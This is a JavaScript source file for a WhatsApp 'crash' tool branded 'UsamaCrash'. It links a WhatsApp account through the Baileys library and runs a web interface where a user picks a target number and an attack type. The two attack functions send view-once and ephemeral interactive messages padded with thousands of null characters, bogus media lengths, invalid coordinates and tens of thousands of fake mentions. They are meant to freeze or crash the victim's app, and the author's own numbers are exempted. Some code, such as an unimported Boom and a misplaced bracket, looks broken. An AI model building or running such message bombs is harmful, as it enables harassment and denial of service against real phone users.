const express = require('express');
const WebSocket = require('ws');
const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
const pino = require('pino');

const app = express();
const port = 3000;

// HTTP server for serving the web interface
app.use(express.static('public'));
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

// WebSocket server for real-time communication
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws) => {
    console.log('New client connected');
    
    let sock;
    
    // Handle messages from client
    ws.on('message', async (message) => {
        const data = JSON.parse(message);
        
        try {
            switch (data.type) {
                case 'request_pairing':
                    await handlePairingRequest(ws, data.phoneNumber);
                    break;
                case 'attack':
                    await handleAttack(ws, data.attackType, data.targetNumber);
                    break;
            }
        } catch (error) {
            console.error('Error:', error);
            ws.send(JSON.stringify({
                type: 'error',
                message: error.message
            }));
        }
    });
    
    // Handle pairing request
    async function handlePairingRequest(ws, phoneNumber) {
        const { state, saveCreds } = await useMultiFileAuthState('./session');
        
        sock = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            auth: state,
            browser: ["Ubuntu", "Chrome", "20.0.04"]
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                ws.send(JSON.stringify({
                    type: 'connection_update',
                    status: 'connected'
                }));
            }
            
            if (connection === 'close') {
                const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
                ws.send(JSON.stringify({
                    type: 'connection_update',
                    status: 'disconnected',
                    reason: reason
                }));
            }
        });
        
        if (!sock.authState.creds.registered) {
            const code = await sock.requestPairingCode(phoneNumber.trim(), "USAMA960");
            ws.send(JSON.stringify({
                type: 'pairing_code',
                code: code
            }));
        }
    }
    
    // Handle attack request
    async function handleAttack(ws, attackType, targetNumber) {
        if (!sock || sock.connection !== 'open') {
            throw new Error('Not connected to WhatsApp');
        }
        
        const target = targetNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        
        // Block certain numbers
        const blockedNumbers = [
            "923239601585",
            "923260167536",
            "923164811599",
            "923260131736",
            "923271636436"
        ];
        
        const targetNum = target.replace(/[^0-9]/g, "");
        if (blockedNumbers.includes(targetNum)) {
            ws.send(JSON.stringify({
                type: 'attack_result',
                success: false,
                message: 'This number is protected by UsamaCrash'
            }));
            return;
        }
        
        try {
            if (attackType === 'fuckvi') {
                await usamanew(sock, target);
            } else if (attackType === 'fuckinvi') {
                await usamanew2(sock, target);
            }
            
            ws.send(JSON.stringify({
                type: 'attack_result',
                success: true,
                message: 'Attack completed successfully'
            }));
        } catch (error) {
            ws.send(JSON.stringify({
                type: 'attack_result',
                success: false,
                message: 'Attack failed: ' + error.message
            }));
        }
    }
    
    // Clean up on disconnect
    ws.on('close', () => {
        console.log('Client disconnected');
        if (sock) {
            sock.end();
        }
    });
});

// Attack functions
async function usamanew(sock, target) {
    const msg = await sock.generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: { 
                        text: '"U̴̦͖͂͛ S̵̪̞̽ A̵̛̳͘ M̶̢̰͌̓ A̴͉̖̚"' 
                    },
                    footer: { 
                        text: '"Ư̵̡̖̳̘̪̱̚͜ ̷̳͕͖̈́͐̐S̵̢̹̗͕̜̩̼̋̈́̎̍̈́̇͑ ̷̢͇͇͓̦̈́̀̿̽̇͜Ä̷̰̟̩̱̹͍̯́̓̇̽̑̚̕̚ ̶̛̙͕̅͛͆͆̍͒̍̑̕M̴̢̢̪͙͖̞̬̮̰͙̓́̍́̇ ̶͈̖͓̮͚̗̅͊͂̍̕͠A̷̡̬̖̱̟̱̳̘̽̄̍͆̓͋͛͘ͅ"' 
                    },
                    carouselMessage: {
                        cards: [
                            {               
                                header: {
                                    title: '\u0000'.repeat(9999),
                                    imageMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                                        mimetype: "image/jpeg",
                                        fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                                        fileLength: "999999999",
                                        height: 1,
                                        width: 1,
                                        mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                                        fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                                        directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                                        mediaKeyTimestamp: "1749172037",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEzIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                                        scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                                        scanLengths: [8596, 155493]
                                    },
                                    hasMediaAttachment: true, 
                                },
                                body: { 
                                    text: "\u0000".repeat(9999)
                                },
                                footer: {
                                    text: "© U S A M A"
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: "\n".repeat(9999) 
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        participant: "0@s.whatsapp.net",    
                        mentionedJid: [
                            "13135550002@s.whatsapp.net", target,
                            ...Array.from({ length: 35000 }, () =>
                            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            ]
                        ],         
                        quotedMessage: {
                            viewOnceMessage: {
                                message: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "call_permission_request",
                                            paramsJson: JSON.stringify(" status: true "),
                                            version: 3
                                        }
                                    }
                                }
                            }
                        },
                        remoteJid: "@s.whatsapp.net"
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });
}

async function usamanew2(sock, target) {
    try {
        const message = {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "\u0000".repeat(9000),
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -6666666666,
                                degreesLongitude: 6666666666,
                                name: "\u0000".repeat(10000),
                                address: "\u0000".repeat(10000)
                            }
                        },
                        body: {
                            text: "UsamaCrash"
                        },
                        footer: {
                            text: "\u0000".repeat(3000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000)
                        },
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 30000 }, () =>
                                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                                )
                            ],
                            externalAdReply: {
                                title: "\u2063".repeat(200),
                                body: "\u2063".repeat(200),
                                mediaType: 1,
                                showAdAttribution: true,
                                thumbnailUrl: "https://files.catbox.moe/xl4fuz.png",
                                sourceUrl: "/u0000".repeat(1000)
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, message, {
            messageId: null,
            participant: { jid: target },
            userJid: target
        });
    } catch (err) {
        console.log("Failed to send amba1:", err);
        throw err;
    }
          }
